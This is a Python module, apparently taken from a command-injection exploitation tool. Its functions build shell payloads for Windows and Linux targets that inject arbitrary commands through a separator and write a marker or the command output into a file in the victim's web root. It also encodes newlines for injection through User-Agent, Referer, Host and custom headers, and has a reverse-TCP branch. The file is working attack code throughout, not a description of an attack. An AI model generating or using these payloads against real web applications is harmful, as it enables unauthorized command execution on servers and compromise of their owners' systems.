import os
import sys
sys.path.append(os.getcwd())
import src.core.setting.setting as settings
def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
    payload = (separator +
              "for /f \"tokens=*\" %i in ('cmd /c " +
              python_payload +
              "') do @set /p = %i " + settings.CMD_NUL
              )
  else:
    payload = (separator +
              "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\")"
               )

  if settings.USER_AGENT_INJECTION == True or \
     settings.REFERER_INJECTION == True or \
     settings.HOST_INJECTION == True or \
     settings.CUSTOM_HEADER_INJECTION == True :
    payload = payload.replace("\n", separator)
  else:
    if settings.TARGET_OS != settings.OS.WINDOWS:
      payload = payload.replace("\n","%0d")

  return payload


def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if settings.REVERSE_TCP:
      payload = (separator + cmd + settings.SINGLE_WHITESPACE
                )
    else:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE + "')\""
      payload = (separator +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do @set /p = %i " + settings.CMD_NUL
                )
  else:
    payload = (separator +
              "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
              )

  # New line fixation
  if settings.USER_AGENT_INJECTION == True or \
     settings.REFERER_INJECTION == True or \
     settings.HOST_INJECTION == True or \
     settings.CUSTOM_HEADER_INJECTION == True:
    payload = payload.replace("\n", separator)
  else:
    if settings.TARGET_OS != settings.OS.WINDOWS:
      payload = payload.replace("\n","%0d")

  return payload

# separator = "--"  # Example separator
# TAG = "Hello, World!"  # Example TAG content
# OUTPUT_TEXTFILE = "output.txt"  # Example output text file name

# # Call the function to generate the payload
# payload = decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)
# print(payload)